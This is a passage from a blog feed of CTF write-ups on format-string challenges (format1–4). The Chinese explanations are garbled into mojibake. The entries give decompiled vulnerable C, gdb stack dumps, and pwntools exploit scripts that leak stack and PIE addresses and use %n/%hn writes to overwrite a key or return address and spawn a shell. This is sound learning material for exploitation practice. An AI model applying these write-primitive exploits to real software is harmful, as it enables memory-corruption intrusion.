class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;What is your name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;\nHello there, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>,drop=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure><h2 id="5-åæ€">5.åæ€</h2><p>åœ¨æ³„éœ²æ ˆçš„å†…å­˜æ˜¯å¿½ç•¥äº†printf()çš„ç¬¬nä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²çš„ç¬¬n+1ä¸ªå‚æ•°,å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯printf()çš„ç¬¬ä¸€ä¸ªå‚æ•°.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æºä»£ç &quot;&gt;1.æºä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016å¤ç°</title>
    <link href="https://www.fomal.cc/posts/b4e8d3.html"/>
    <id>https://www.fomal.cc/posts/b4e8d3.html</id>
    <published>2023-04-02T03:02:22.708Z</published>
    <updated>2023-04-02T03:03:02.002Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>format3 Write Up</title>
    <link href="https://www.fomal.cc/posts/8afbe4b2.html"/>
    <id>https://www.fomal.cc/posts/8afbe4b2.html</id>
    <published>2023-04-02T03:02:22.706Z</published>
    <updated>2023-04-02T03:03:02.001Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-é˜²æŠ¤æ£€æŸ¥">1.é˜²æŠ¤æ£€æŸ¥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨%nä¿®æ”¹.bssæ®µä¸Šçš„keyçš„å€¼å°±å¯ä»¥è·å¾—shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 3/4&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;here,you must change something...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">2023</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io=process(&#x27;./format3&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">key=<span class="number">0x60208C</span></span><br><span class="line">pad=<span class="string">b&#x27;%2023c&#x27;</span>+<span class="string">b&#x27;%8$nAAAAAA&#x27;</span>+p64(key)</span><br><span class="line"><span class="comment">#pad=b&#x27;%6$p%7$p&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....&#x27;</span>,pad)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-çŸ¥è¯†ç‚¹">4.çŸ¥è¯†ç‚¹</h2><h3 id="1">(1)</h3><p>%nå’Œ%pç­‰éƒ½å¯ä»¥ç”¨%[order]$n,%[order]$pç­‰å½¢å¼è®¿é—®,è¿™é‡Œçš„orderæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬orderä¸ªå‚æ•°,å³printf()çš„å‚æ•°è¡¨çš„ç¬¬order+1ä¸ªå‚æ•°</p><h3 id="2">(2)</h3><p>åœ¨ä»»æ„åœ°å€å†™çš„æ—¶å€™ä¸€èˆ¬ä¸æŠŠåœ°å€æ”¾åœ¨payloadå‰é¢,å› ä¸ºåœ°å€å¾€å¾€å‰é¢éƒ½ä¼šæœ‰0è®©printf()è¯»å–å‚æ•°æ—¶ç›´æ¥æˆªæ–­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-é˜²æŠ¤æ£€æŸ¥&quot;&gt;1.é˜²æŠ¤æ£€æŸ¥&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>format4 Write Up</title>
    <link href="https://www.fomal.cc/posts/6827ffcb.html"/>
    <id>https://www.fomal.cc/posts/6827ffcb.html</id>
    <published>2023-04-02T03:02:22.705Z</published>
    <updated>2023-04-02T03:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æºä»£ç ">1.æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-31h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;anything else to say?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%2s&quot;</span>, &amp;v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != <span class="string">&#x27;n&#x27;</span> &amp;&amp; v1 != <span class="string">&#x27;N&#x27;</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 4/4&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°ä¿æŠ¤å…¨å¼€,ä¸è¿‡å·²ç»åœ¨IDAæ‰¾åˆ°äº†è°ƒç”¨shellçš„åé—¨å‡½æ•°,è¿˜æœ‰ä¸€ä¸ªvuln()å¾ªç¯ä½¿ç”¨ç›´åˆ°è¾“å…¥â€™nâ€™æˆ–è€…â€™Nâ€™çš„å‡½æ•°,å…¶å†…éƒ¨å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´,æ‰€ä»¥åˆ©ç”¨ä¸¤æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²å‡ºæ ˆçš„åœ°å€å’Œç¨‹åºåŠ è½½åœ°å€,é€šè¿‡IDAæä¾›çš„åç§»é‡ç¨å¾®è®¡ç®—è·å¾—è¦ä¿®æ”¹çš„è¿”å›åœ°å€çš„æ ˆçš„åœ°å€å’Œåé—¨å‡½æ•°å®é™…åœ°å€.å†é€šè¿‡ä½è¿ç®—è·å¾—ä¸‹é¢expä¸­retçš„åå››ä½,ç”¨Aå¡«å……æˆ16å­—èŠ‚,å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬å…«ä¸ªå‚æ•°æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²,å‰é¢å·²ç»å ç”¨äº†16å­—èŠ‚,æ‰€ä»¥è¦ä¿®æ”¹çš„stackå°±æ˜¯%10$hn.è™½ç„¶ç”¨hnåªèƒ½ä¿®æ”¹æœ€åå››ä¸ªå­—èŠ‚çš„æ•°æ®,ä½†æ˜¯PIEåŸºå€éšæœºæ˜¯ä»¥é¡µä¸ºå•ä½,å¤§å°ä¸º0x1000,æ‰€ä»¥æœ€å°‘åªè¦æ›´æ”¹åé¢çš„ä¸‰ä¸ªå­—èŠ‚,ç”¨hnæ¯”nä¼šæ›´æ–¹ä¾¿ä¸€äº›.</p><pre><code>æœ€ååœ¨è°ƒè¯•expæ—¶è¿˜å‘ç°è™½ç„¶scanf()èƒ½æ¥å—%2sä½†æ˜¯å¦‚æœè¾“å…¥è¶…è¿‡ä¸€ä¸ªå­—ç¬¦ä¼šç›´æ¥è·³è¿‡ä¸‹æ¬¡å¾ªç¯çš„ç¬¬ä¸€æ¬¡è¾“å…¥,è°ƒæ•´ä¸€ä¸‹è·å¾—flag</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ rsp 0x7fffffffddc0 â—‚â€” 0x11</span><br><span class="line">01:0008â”‚     0x7fffffffddc8 â—‚â€” 0x41007ffff7fae6a0</span><br><span class="line">02:0010â”‚     0x7fffffffddd0 â—‚â€” <span class="string">&#x27;%8$p%9$p%10$p\n&#x27;</span></span><br><span class="line">03:0018â”‚     0x7fffffffddd8 â—‚â€” 0xa7024303125 /* <span class="string">&#x27;%10$p\n&#x27;</span> */</span><br><span class="line">04:0020â”‚     0x7fffffffdde0 â€”â–¸ 0x555555400a40 (__libc_csu_init) â—‚â€” push   r15</span><br><span class="line">05:0028â”‚     0x7fffffffdde8 â€”â–¸ 0x7fffffffde10 â—‚â€” 0x0</span><br><span class="line">06:0030â”‚     0x7fffffffddf0 â€”â–¸ 0x5555554007f0 (_start) â—‚â€” xor    ebp, ebp</span><br><span class="line">07:0038â”‚     0x7fffffffddf8 â—‚â€” 0x8fd9ef6ec969cc00 </span><br><span class="line">08:0040â”‚ rbp 0x7fffffffde00 â€”â–¸ 0x7fffffffde10 â—‚â€” 0x0 <span class="comment">#previous rbpå¯ä»¥æ³„éœ²å‡ºæ ˆçš„åœ°å€,å‡å»0x8å°±æ˜¯ç°åœ¨çš„rbp</span></span><br><span class="line">09:0048â”‚     0x7fffffffde08 â€”â–¸ 0x555555400a39 (main+46) â—‚â€” mov    eax, 0 <span class="comment">#å‡½æ•°è¿”å›åœ°å€,é€šè¿‡è¿™ä¸ªå¼„å‡ºç¨‹åºåŠ è½½åŸºåœ°å€</span></span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;ip&#x27;</span>,port)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ç¬¬8æ ¼å¼åŒ–å­—ç¬¦ä¸²,ç¬¬15ä¸ªè¿”å›åœ°å€-0xa39+0x951è·å¾—ç¨‹åºåŠ è½½åœ°å€,ç¬¬14ä¸ª-0x8ç›´æ¥è·å¾—æ ˆåœ°å€</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,<span class="string">b&#x27;%14$p&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x8</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">ret=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0xa39</span>+<span class="number">0x951</span> <span class="comment">#64ä½ç¨‹åºæ ˆå¯¹é½æ‰€ä»¥è·³è¿‡äº†push rbp</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hn&#x27;</span> <span class="comment">#è·å¾—retçš„æœ€åå››ä½å¹¶è½¬åŒ–æˆå­—èŠ‚å‹æ•°æ®</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">b&#x27;A&#x27;</span>)+p64(stack)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;leave something.....\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;anything else to say?\n&#x27;</span>,<span class="string">b&#x27;no&#x27;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æºä»£ç &quot;&gt;1.æºä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>format2 Write Up</title>
    <link href="https://www.fomal.cc/posts/65398f8c.html"/>
    <id>https://www.fomal.cc/posts/65398f8c.html</id>
    <published>2023-04-02T03:02:22.703Z</published>
    <updated>2023-04-02T03:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æ£€æŸ¥é˜²æŠ¤">1.æ£€æŸ¥é˜²æŠ¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><p>å’Œformat1ä¸åŒçš„æ˜¯,è¿™ä¸€æ¬¡é‡‡ç”¨çš„æ˜¯æŒ‡é’ˆçš„å½¢å¼,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å…ˆè¾“å…¥v6,ç”¨%næ¥ä¿®æ”¹æ ˆä¸Šçš„v7æŒ‡å‘çš„v5,è®©v6å’Œv5çš„å€¼ç›¸ç­‰å³å¯.</p><p>gdbç®€å•è°ƒè¯•ä¸€ä¸‹å‘ç°v7æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬8ä¸ªå‚æ•°,æ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥0,ç¬¬äºŒæ¬¡è¾“å…¥%9$nå°±å¯ä»¥æŠŠv5çš„å€¼æ”¹ä¸º0è·å¾—flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = &amp;v5;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  ini(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Format String 2/4&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;here,you must guess the random num&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = rand();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;guess...&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;leave something.....&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *v7 == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Format String 2/4</span><br><span class="line">here,you must guess the random num</span><br><span class="line">guess...</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">leave something.....</span><br><span class="line">%9<span class="variable">$n</span></span><br><span class="line"></span><br><span class="line">You win!</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-æ£€æŸ¥é˜²æŠ¤&quot;&gt;1.æ£€æŸ¥é˜²æŠ¤&lt;/h2&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>format1 Write Up</title>
    <link href="https://www.fomal.cc/posts/8e0e348f.html"/>
    <id>https://www.fomal.cc/posts/8e0e348f.html</id>
    <published>2023-04-02T03:02:22.702Z</published>
    <updated>2023-04-02T03:03:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-æ£€æŸ¥é˜²æŠ¤">1.æ£€æŸ¥é˜²æŠ¤</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><p>åç¼–è¯‘ä»¥å,srand()å–çš„æ˜¯å½“å‰æ—¶é—´,æ‰€ä»¥ä¼ªéšæœºæ•°çš„éšæœºæ€§å¢å¼º,ä¸é€‚åˆå¾ªç¯çŒœ(),å‘ç°v6å’Œv5éƒ½åœ¨æ ˆä¸Š,å› ä¸ºå…ˆæœ‰v6ç„¶åæ‰æœ‰read()å‡½æ•°,æ‰€ä»¥è€ƒè™‘ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ ˆä¸Šçš„v6çš„å€¼ç„¶ååœ¨v5ä¸­è¾“å…¥çŒœå‡ºæ¥çš„å€¼å°±å¯ä»¥è·³å‡ºå¾ªç¯.gdbè°ƒè¯•å‘ç°v6å’Œv5åˆèµ·æ¥åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç¬¬ä¸ƒä¸ªå‚æ•°ä¸Š,v6åœ¨é«˜ä½.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-44h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+48h] 